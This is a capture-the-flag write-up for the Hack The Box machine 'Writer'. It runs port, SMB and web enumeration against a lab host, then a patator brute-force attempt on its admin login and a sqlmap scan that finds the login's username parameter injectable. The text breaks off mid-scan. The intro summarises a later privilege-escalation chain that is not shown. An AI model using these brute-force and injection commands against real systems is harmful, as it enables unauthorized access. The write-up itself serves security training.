# [writer](https://app.hackthebox.eu/machines/Writer)

> A Linux macine with a web application whose administrator login form is vulnerable to SQL injection. The SQL injection vulnerability can be abused to disclose the application's source code, which reveals a command injection vulnerability that can be leveraged to gain a foothold on the machine. Once on the machine, a configuration file for another web application in development reveals MySQL credentials, which can be used to dump a user's password hash. The user's password is in the word list rockyou.txt and thus, easily crackable. The user account is in a group capable of writing a malicious payload to a file that is executed by another user that is triggered whenever that user receives an email, providing access to that user's account. That user can write a malicious payload to `/etc/apt/apt.conf.d/` and `root` has a cronjob continually executing `apt-get update`, allowing the user to escalate privileges.

---

## Open Port Enumeration

### TCP

```bash
$ masscan -p1-65535 10.10.11.101 --rate=1000 -e tun0 --output-format grepable --output-filename writer.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 15:56:49 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat writer.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
139,22,445,80,
```

```bash
$ nmap -sC -sV -O -p139,22,445,80 10.10.11.101 -oA writer
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-02 12:01 EDT
Nmap scan report for 10.10.11.101
Host is up (0.045s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -13s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2021-10-02T16:01:16
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.62 seconds
```

The OpenSSH banner reveals the target is Ubuntu 20.04.

### UDP

```bash
$ nmap -sU 10.10.11.101
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-02 11:57 EDT
Stats: 0:16:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 98.25% done; ETC: 12:13 (0:00:18 remaining)
Nmap scan report for 10.10.11.101
Host is up (0.043s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE         SERVICE
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm

Nmap done: 1 IP address (1 host up) scanned in 1019.98 seconds
```

---

## SMB Enumeration

```bash
$ enum4linux -a 10.10.11.101
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct  2 12:14:43 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.11.101
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.11.101    |
 ====================================================
[+] Got domain/workgroup name: WORKGROUP

 ============================================
|    Nbtstat Information for 10.10.11.101    |
 ============================================
Looking up status of 10.10.11.101
        WRITER          <00> -         B <ACTIVE>  Workstation Service
        WRITER          <03> -         B <ACTIVE>  Messenger Service
        WRITER          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 =====================================
|    Session Check on 10.10.11.101    |
 =====================================
[+] Server 10.10.11.101 allows sessions using username '', password ''

 ===========================================
|    Getting domain SID for 10.10.11.101    |
 ===========================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================
|    OS information on 10.10.11.101    |
 ======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.11.101 from smbclient:
[+] Got OS info for 10.10.11.101 from srvinfo:
        WRITER         Wk Sv PrQ Unx NT SNT writer server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================
|    Users on 10.10.11.101    |
 =============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle     Name: Kyle Travis       Desc:

user:[kyle] rid:[0x3e8]

 =========================================
|    Share Enumeration on 10.10.11.101    |
 =========================================

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        writer2_project Disk
        IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.11.101
//10.10.11.101/print$   Mapping: DENIED, Listing: N/A
//10.10.11.101/writer2_project  Mapping: DENIED, Listing: N/A
//10.10.11.101/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================
|    Password Policy Information for 10.10.11.101    |
 ====================================================


[+] Attaching to 10.10.11.101 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] WRITER
        [+] Builtin

[+] Password Info for Domain: WRITER

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ==============================
|    Groups on 10.10.11.101    |
 ==============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 =======================================================================
|    Users on 10.10.11.101 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1663171886-1921258872-720408159 and logon username '', password ''
S-1-5-21-1663171886-1921258872-720408159-500 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-501 WRITER\nobody (Local User)
S-1-5-21-1663171886-1921258872-720408159-502 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-503 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-504 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-505 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-506 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-507 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-508 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-509 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-510 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-511 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-512 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-513 WRITER\None (Domain Group)
S-1-5-21-1663171886-1921258872-720408159-514 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-515 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-516 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-517 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-518 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-519 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-520 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-521 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-522 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-523 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-524 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-525 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-526 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-527 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-528 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-529 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-530 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-531 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-532 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-533 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-534 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-535 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-536 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-537 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-538 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-539 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-540 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-541 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-542 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-543 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-544 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-545 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-546 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-547 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-548 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-549 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-550 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)
S-1-5-21-1663171886-1921258872-720408159-1001 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1002 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1003 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1004 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1005 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1006 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1007 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1008 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1009 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1010 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1011 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1012 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1013 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1014 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1015 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1016 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1017 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1018 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1019 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1020 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1021 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1022 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1023 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1024 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1025 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1026 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1027 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1028 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1029 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1030 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1031 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1032 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1033 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1034 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1035 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1036 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1037 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1038 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1039 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1040 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1041 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1042 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1043 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1044 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1045 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1046 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1047 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1048 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1049 *unknown*\*unknown* (8)
S-1-5-21-1663171886-1921258872-720408159-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kyle (Local User)
S-1-22-1-1001 Unix User\john (Local User)

 =============================================
|    Getting printer info for 10.10.11.101    |
 =============================================
No printers returned.


enum4linux complete on Sat Oct  2 12:17:57 2021
```

Shares:
- `print$`
- `writer2_project`

Users:
- `kyle` (name: Kyle Travis)
- `john`

---

## Web Application Enumeration

The web site is for **Story Bank**, which appears to be a professional writer's organization. The page contains several blog posts, a page about the writer, and a functional contact form. There are references to the hostname `writer.htb`, so add this name to the local DNS resolver.

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://writer.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://writer.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/10/02 14:02:49 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/10/02 14:04:23 Finished
===============================================================
```

Nothing.

### Content Discovery

```bash
$ gobuster dir -u http://writer.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/10/02 14:01:40 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 4905]
/logout               (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/about                (Status: 200) [Size: 3522]
/static               (Status: 301) [Size: 313] [--> http://10.10.11.101/static/]
/.                    (Status: 200) [Size: 33052]
/dashboard            (Status: 302) [Size: 208] [--> http://10.10.11.101/]
/server-status        (Status: 403) [Size: 277]
/administrative       (Status: 200) [Size: 1443]

===============================================================
2021/10/02 14:09:45 Finished
===============================================================
```

---

### Web Application Contact Form

The application's contact form appears to send a `POST` request to `/contact.php`. However, it triggers the following JavaScript which validates the input and then submits the data as a `GET` request to `/contact.php`.

```javascript
//////CONTACT FORM VALIDATION
jQuery(document).ready(function ($) {
	
	//if submit button is clicked
	$('#submit').click(function () {		
		
		//Get the data from all the fields
		var name = $('input[name=name]');
		var email = $('input[name=email]');
		var regx = /^([a-z0-9_\-\.])+\@([a-z0-9_\-\.])+\.([a-z]{2,4})$/i;
		var comment = $('textarea[name=comment]');
		var returnError = false;
		
		//Simple validation to make sure user entered something
		//Add your own error checking here with JS, but also do some error checking with PHP.
		//If error found, add hightlight class to the text field
		if (name.val()=='') {
			name.addClass('error');
			returnError = true;
		} else name.removeClass('error');
		
		if (email.val()=='') {
			email.addClass('error');
			returnError = true;
		} else email.removeClass('error');		
		
		if(!regx.test(email.val())){
          email.addClass('error');
          returnError = true;
		} else email.removeClass('error');
		
		
		if (comment.val()=='') {
			comment.addClass('error');
			returnError = true;
		} else comment.removeClass('error');
		
		// Highlight all error fields, then quit.
		if(returnError == true){
			return false;	
		}
		
		//organize the data
		
		var data = 'name=' + name.val() + '&email=' + email.val() + '&comment='  + encodeURIComponent(comment.val());

		//disabled all the text fields
		$('.text').attr('disabled','true');
		
		//show the loading sign
		$('.loading').show();
		
		//start the ajax
		$.ajax({
			//this is the php file that processes the data and sends email
			url: "contact.php",	
			
			//GET method is used
			type: "GET",

			//pass the data			
			data: data,		
			
			//Do not cache the page
			cache: false,
			
			//success
			success: function (html) {				
				//if contact.php returned 1/true (send mail success)
				if (html==1) {
				
					//show the success message
					$('.done').fadeIn('slow');
					
					$(".form").find('input[type=text], textarea').val("");
					
				//if contact.php returned 0/false (send mail failed)
				} else alert('Sorry, unexpected error. Please try again later.');				
			}		
		});
		
		//cancel the submit button default behaviours
		return false;
	});	
});
```

The request generated:

```http
GET /contact.php?name=tgihf&email=tgihf@writer.htb&comment=blah&_=1633197972500 HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Referer: http://writer.htb/contact
Sec-GPC: 1
```

Interestingly, the request results in a 404. Attempting to submit it as a `POST` request results in a 405 Method Not Allowed. It appears that this form is just a leftover relic from the original website template and thus, isn't a pertinent path forward.

---

### Web Application Administrative Login Form

The `/administrative` URL path is a login form.

![](images/Pasted%20image%2020211002141903.png)

Attempt to brute force the login form with keywords from the challenge.

```bash
$ cat keywords.txt
kyle
john
admin
user
password
password123
story
board
storyboard
story-board
$ patator http_fuzz url='http://writer.htb/administrative' body='uname=FILE0&password=FILE1' 0=keywords.txt 1=keywords.txt -x ignore:fgrep='Incorrect credentials supplied'
14:29:15 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-10-02 14:29 EDT
14:29:15 patator    INFO -
14:29:15 patator    INFO - code size:clen       time | candidate                          |   num | mesg
14:29:15 patator    INFO - -----------------------------------------------------------------------------
14:29:16 patator    INFO - Hits/Done/Skip/Fail/Size: 0/100/0/0/100, Avg: 90 r/s, Time: 0h 0m 1s
```

No luck.

#### SQL Injection Authentication Bypass

Output the login request to a text file.

```bash
$ cat login-request.txt
POST /administrative HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.10.11.101
DNT: 1
Connection: close
Referer: http://10.10.11.101/administrative
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uname=admin&password=password
```

Test the login form for a SQL injection vulnerability.

```bash
$ sqlmap -r login-request.txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:42 /2021-10-02/

[14:40:42] [INFO] parsing HTTP request from 'login-request.txt'
[14:40:42] [INFO] testing connection to the target URL
[14:40:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:40:42] [INFO] testing if the target URL content is stable
[14:40:43] [INFO] target URL content is stable
[14:40:43] [INFO] testing if POST parameter 'uname' is dynamic
[14:40:43] [WARNING] POST parameter 'uname' does not appear to be dynamic
[14:40:43] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[14:40:43] [INFO] testing for SQL injection on POST parameter 'uname'
[14:40:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:40:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:40:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:40:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:40:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:40:44] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:40:44] [INFO] testing 'Generic inline queries'
[14:40:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] y
got a 302 redirect to 'http://10.10.11.101/'. Do you want to follow? [Y/n] y
[14:41:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:41:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:41:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:41:15] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[14:41:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:41:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
